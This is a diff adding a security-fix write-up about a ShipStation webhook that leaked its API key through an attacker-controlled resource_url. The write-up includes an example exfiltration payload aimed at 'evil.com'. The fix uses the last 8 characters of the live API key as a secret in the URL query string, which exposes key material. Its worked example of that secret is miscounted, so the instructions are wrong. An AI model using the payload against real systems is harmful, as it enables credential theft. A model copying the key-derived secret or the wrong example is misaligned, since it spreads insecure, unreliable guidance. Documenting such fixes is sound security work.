@@ -60,3 +60,22 @@ The client still sends `amount` in the request but the server ignores it.
 
 **Risk:** Low. The client already sends `invoiceId` and `invoiceType`. The only behavioral change is that the amount is now authoritative from Firestore. If a draft invoice total is $0 (no line items yet), the function returns an error instead of creating a $0 pay link — which is correct behavior.
 
+---
+
+## TB-1: ShipStation webhook credential leak + no authentication
+
+**Confirmed:** `shipStationWebhook` (line 1072) had no caller verification. It fetched `payload.resource_url` with the ShipStation API key in the Authorization header. An attacker could POST `{resource_url: "https://evil.com/steal"}` and receive the API credentials.
+
+**Changed:**
+1. **Shared secret check:** Function now requires `?secret=XXXXXXXX` query parameter. The secret is derived from the last 8 characters of `SHIPSTATION_API_KEY`. Requests without a valid secret get 403.
+2. **URL origin validation:** `resource_url` must start with `https://ssapi.shipstation.com/`. Any other origin is rejected with 400 before credentials are sent.
+
+Both checks run before any Firestore reads, email sends, or inventory deductions.
+
+**Risk:** Requires updating the ShipStation webhook URL in the ShipStation admin panel to include `?secret=XXXXXXXX` (last 8 chars of your API key). Until this is done, all ShipStation webhooks will be rejected with 403. To get the secret value:
+```
+# Last 8 chars of your SHIPSTATION_API_KEY value
+# e.g., if key is "abc123:xyz789def", secret is "xyz789de" (last 8 of full string)
+```
+Update in ShipStation → Settings → Stores → Webhook URL: append `?secret=YOUR8CHARS`
+
